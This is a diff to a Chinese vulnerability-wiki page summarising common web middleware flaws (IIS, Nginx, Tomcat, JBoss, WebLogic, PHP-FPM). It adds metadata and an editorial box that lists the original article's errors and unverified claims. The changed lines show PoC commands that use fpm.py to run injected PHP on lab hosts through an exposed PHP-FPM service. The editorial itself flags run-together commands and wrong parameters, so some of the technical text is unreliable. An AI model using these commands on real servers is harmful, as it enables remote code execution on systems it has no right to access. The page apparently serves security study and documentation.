@@ -1,8 +1,56 @@
 ---
 source: "MrWQ/vulnerability-paper"
+title: "Web 中间件常见漏洞总结"
+product: "IIS/HTTPd/Nginx/Tomcat/JBoss/WebLogic/PHP-FPM/CGI"
+record_type: "vulnerability"
+review_status: "text-reviewed"
+verification_status: "not-reproduced"
+content_status: "needs-review"
+identifier_status: "unknown"
+primary_identifiers: ""
+referenced_identifiers: "CVE-2012-1823"
+identifier_role: "reference"
+prerequisites: "每节版本/权限/配置不同，多数为危险部署或已有管理权限；不能整篇归Apache单一漏洞"
+source_status: "unknown"
+side_effects: "含落盘脚本或账户创建：会留下持久状态。记录本次生成的路径或账户，测试后清理这些对象并撤销关联令牌；不要删除既有业务对象。"
+id: "vw-6cb83e437344f762830009e3"
+entity_id: "ve-6cb83e437344f762830009e3"
+schema_version: "1"
 ---
 
 # Web 中间件常见漏洞总结
+
+<!-- vulwiki-editorial:start -->
+## 校订与适用边界
+
+- 适用前提：每节版本/权限/配置不同，多数为危险部署或已有管理权限；不能整篇归Apache单一漏洞
+- 证据范围：全文22985字符分两段读完，原理/步骤/修复存在，主要PoC和截图未文字化；多处把页面状态当漏洞证据
+
+### 本次正文校订
+
+- 按实际内容修正 2 处代码围栏语言标记，保留其中方法与请求内容。
+
+### 尚未解决的证据缺口
+
+以下限制仍适用于后文历史材料；相关版本、结果或修复结论不能据此视为已验证：
+
+- JBoss /invoker/readonly返回500不等于存在可利用反序列化
+- Nginx autoindex是目录列举非路径穿越，PHP解析须FPM配置；.gif.2.php与pathinfo示例矛盾
+- HTTPd不一定从右向左直到未知后缀，是多扩展处理器/配置语义；Options指令缺空格
+- PHP-FPM仅更改端口不是有效修复，应限制监听/访问控制
+- PHP5.3.12安全结论遗漏后续绕过/分支修复；WebLogic把.jsp改.jspx未证能消除功能，可能仍被映射
+- IIS短文件名禁新建不移除既存短名；跨盘重命名步骤不成立
+- Tomcat不是HTTPd扩展，manager-gui等是角色不是目录；多段命令黏连、参数拼错
+- 多项固定漏洞无编号/版本，管理war部署需与代码缺陷分开
+
+### 操作风险与资料使用
+
+- 含落盘脚本或账户创建：会留下持久状态。记录本次生成的路径或账户，测试后清理这些对象并撤销关联令牌；不要删除既有业务对象。
+
+本页为文本校订，未执行代码、PoC 或目标请求；原图仅保留引用，未据此确认复现成功。
+<!-- vulwiki-editorial:end -->
+
+## 技术正文与历史材料
 
 <meta name="referrer" content="no-referrer"/>
 \> 本文由 \[简悦 SimpRead\](http://ksria.com/simpread/) 转码， 原文地址 \[mp.weixin.qq.com\](https://mp.weixin.qq.com/s/WKHi90lOtubwMc28fNwVCw)
@@ -777,7 +825,7 @@ https://support.oracle.com/rs?type=doc&id=2394520.1
 
 使用命令执行一个默认存在的 php 文件。
 
-```
+```shell
 python fpm.py 192.168.237.136 /usr/local/lib/php/PEAR.php
 ```
 
@@ -785,7 +833,7 @@ python fpm.py 192.168.237.136 /usr/local/lib/php/PEAR.php
 
 利用命令进行任意命令执行复现。
 
-```
+```shell
 python fpm.py 192.168.139.129 /usr/local/lib/php/PEAR.php-c '<?php echo \`pwd\`; ?>'python fpm.py 192.168.139.129 /usr/local/lib/php/PEAR.php-c '<?php echo \`ifconfig\`; ?>'python fpm.py 192.168.139.129 /usr/local/lib/php/PEAR.php-c '<?php echo \`ls\`; ?>'
 ```
 
